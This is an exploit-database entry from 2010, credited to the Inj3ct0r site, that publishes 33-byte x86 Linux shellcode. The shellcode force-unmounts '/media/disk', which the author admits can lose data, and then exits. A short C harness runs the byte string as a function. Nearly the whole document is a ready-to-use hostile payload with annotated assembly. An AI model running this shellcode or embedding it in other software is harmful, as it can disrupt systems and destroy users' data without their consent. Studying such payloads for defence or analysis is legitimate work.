/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : force unmount "/media/disk" x86 linux shellcode (some data cause lost)
Name   : 33 bytes force unmount "/media/disk" linux x68 shellcode
Date   : Fri Jun  4 13:15:51 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x0f"                    /* jmp    0x8048071 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x34"                    /* mov    $0x34,%al */
		"\x5b"                        /* pop    %ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xec\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x6d"                        /* insl   (%dx),%es:(%edi) */
		"\x65\x64\x69\x61\x2f\x64\x69"/* imul $0x6b736964,%fs:%gs:0x2f(%ecx),%esp */
		"\x73\x6b";

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}